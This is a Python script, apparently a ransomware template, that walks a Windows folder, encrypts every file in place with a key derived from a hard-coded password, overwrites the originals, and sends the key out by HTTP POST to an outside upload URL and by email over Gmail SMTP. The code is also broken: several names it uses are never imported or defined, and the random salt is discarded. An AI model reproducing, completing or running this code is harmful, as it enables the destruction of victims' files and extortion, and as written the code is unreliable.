import os
import smtplib
import getpass

import cryptography
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# Adding server upload
import requests

# Define the URL of the remote server
URL = "https://example.com/upload"


# Define the directory to scan for files
DIRECTORY = "C:\\files"

# Define the password to use for encrypting the files
PASSWORD = "my_secret_password"

# Define the email address to send the key to
EMAIL_ADDRESS = "example@gmail.com"

# Generate a random salt and use it to derive an encryption key
salt = os.urandom(16)
kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256(),
    length=32,
    salt=salt,
    iterations=100000,
    backend=cryptography.hazmat.backends.default_backend(),
)
key = base64.urlsafe_b64encode(kdf.derive(PASSWORD.encode()))

# Create a Fernet object that can be used to encrypt and decrypt data
fernet = Fernet(key)

# Scan the specified directory for files
for root, dirs, files in os.walk(DIRECTORY):
    for filename in files:
        # Read the file contents into memory
        filepath = os.path.join(root, filename)
        with open(filepath, "rb") as f:
            data = f.read()

        # Encrypt the data using the Fernet object
        encrypted_data = fernet.encrypt(data)

        # Overwrite the original file with the encrypted data
        with open(filepath, "wb") as f:
            f.write(encrypted_data)


# Send a POST request to the remote server with the key as the request body
response = requests.post(URL, data=key)


# Create an email message to send the key
message = MIMEMultipart()
message["From"] = EMAIL_ADDRESS
message["To"] = EMAIL_ADDRESS
message["Subject"] = "Encryption Key"

# Add the key as the email message body
message.attach(MIMEText(key, "plain"))

# Connect to the email server and send the email
server = smtplib.SMTP("smtp.gmail.com", 587)
server.starttls()
server.login(EMAIL_ADDRESS, getpass.getpass())
server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, message.as_string())
server.quit()

# Delete the key file
os.remove(KEY_FILE_PATH)





